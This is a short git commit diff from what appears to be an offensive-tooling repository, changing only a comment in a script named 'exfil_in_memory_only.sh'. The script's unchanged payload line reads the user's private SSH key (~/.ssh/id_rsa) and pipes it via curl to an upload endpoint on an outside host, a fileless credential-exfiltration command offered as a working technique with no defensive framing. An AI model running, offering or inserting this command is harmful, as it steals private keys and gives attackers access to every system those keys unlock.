5ddb1ff957686b9f015304ef8b37bd727b5e3580
Albetro <albertxang@gmail.com>
2025-07-28 23:13:24 +0300

    Read sensitive files and exfil without writing to disk

--- lets_advance/exfiltration/exfil_in_memory_only.sh
+++ lets_advance/exfiltration/exfil_in_memory_only.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
-# Fileless exfil: cat + curl pipe without temp files
+# Fileless exfil: cat + curl pipe without temporary files
 
 cat ~/.ssh/id_rsa | curl -X POST -F file=@- http://10.11.0.123:8000/upload
